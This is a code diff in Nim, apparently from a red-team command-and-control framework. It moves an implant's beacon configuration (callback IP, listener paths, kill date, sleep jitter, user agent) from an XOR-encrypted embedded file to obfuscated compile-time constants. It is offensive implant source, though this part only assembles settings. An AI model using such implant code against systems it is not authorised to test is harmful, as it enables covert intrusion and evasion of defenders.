@@ -1,6 +1,8 @@
 import parsetoml, strutils, tables
+import macros
 from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
 import ../util/strenc
+
 # Parse the configuration file
 # This constant will be stored in the binary itself (hence the XOR)
 proc parseConfig*() : Table[string, string] =
@@ -8,29 +10,36 @@ proc parseConfig*() : Table[string, string] =
 
     # Allow us to re-write the static XOR key used for pre-crypto operations
     # This is handled by the Python wrapper at compile time, the default value shouldn't be used
-    const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
-    
+    const IMPLANT_CALLBACK_IP {.strdefine.}: string = obf("127.0.0.1")
+    const HOSTNAME {.strdefine.}: string = obf("")
+    const TYPE {.strdefine.}: string = obf("")
+    const PORT {.intdefine.}: int = 0
+    const REGISTER_PATH {.strdefine.}: string = obf("")
+    const TASK_PATH {.strdefine.}: string = ""
+    const RESULT_PATH {.strdefine.}: string = ""
+    const RECONNECT_PATH {.strdefine.}: string = ""
+    const KILL_DATE {.strdefine.}: string = ""
+    const SLEEP_TIME {.intdefine.}: int = 0
+    const SLEEP_JITTER {.intdefine.}: int = 0
+    const USER_AGENT {.strdefine.}: string = ""
+    const HTTP_ALLOW_COMMUNICATION_KEY {.strdefine.}: string = ""
+
     # Workspace identifier for this implant
     const workspace_uuid {.strdefine.}: string = ""
 
-    # Embed the configuration as a XORed sequence of bytes at COMPILE-time
-    const embeddedConf = xorStringToByteSeq(staticRead(obf("../../config.toml")), INITIAL_XOR_KEY)
-    
-    # Decode the configuration at RUNtime and parse the TOML to store it in a basic table
-    var tomlConfig = parsetoml.parseString(xorByteSeqToString(embeddedConf, INITIAL_XOR_KEY))
-    config[obf("hostname")]         = tomlConfig[obf("implants_server")][obf("hostname")].getStr()
-    config[obf("listenerType")]     = tomlConfig[obf("implants_server")][obf("type")].getStr()
-    config[obf("listenerPort")]     = $tomlConfig[obf("implants_server")][obf("port")].getInt()
-    config[obf("listenerRegPath")]  = tomlConfig[obf("implants_server")][obf("registerPath")].getStr()
-    config[obf("listenerTaskPath")] = tomlConfig[obf("implants_server")][obf("taskPath")].getStr()
-    config[obf("listenerResPath")]  = tomlConfig[obf("implants_server")][obf("resultPath")].getStr()
-    config[obf("reconnectPath")]    = tomlConfig[obf("implants_server")][obf("reconnectPath")].getStr()
-    config[obf("implantCallbackIp")]       = tomlConfig[obf("implant")][obf("implantCallbackIp")].getStr()
-    config[obf("killDate")]         = $tomlConfig[obf("implant")][obf("killDate")].getStr()
-    config[obf("sleepTime")]        = $tomlConfig[obf("implant")][obf("sleepTime")].getInt()
-    config[obf("sleepJitter")]      = $tomlConfig[obf("implant")][obf("sleepJitter")].getInt()
-    config[obf("userAgent")]        = tomlConfig[obf("implant")][obf("userAgent")].getStr()
-    config[obf("httpAllowCommunicationKey")] = tomlConfig[obf("implant")][obf("httpAllowCommunicationKey")].getStr()
+    config[obf("hostname")]         = $HOSTNAME
+    config[obf("listenerType")]     = $TYPE
+    config[obf("listenerPort")]     = $PORT
+    config[obf("listenerRegPath")]  = $REGISTER_PATH
+    config[obf("listenerTaskPath")] = $TASK_PATH
+    config[obf("listenerResPath")]  = $RESULT_PATH
+    config[obf("reconnectPath")]    = $RECONNECT_PATH
+    config[obf("implantCallbackIp")]       = IMPLANT_CALLBACK_IP
+    config[obf("killDate")]         = KILL_DATE
+    config[obf("sleepTime")]        = $SLEEP_TIME
+    config[obf("sleepJitter")]      = $SLEEP_JITTER
+    config[obf("userAgent")]        = USER_AGENT
+    config[obf("httpAllowCommunicationKey")] = HTTP_ALLOW_COMMUNICATION_KEY
     
     # Add workspace information if defined
     if workspace_uuid != "":
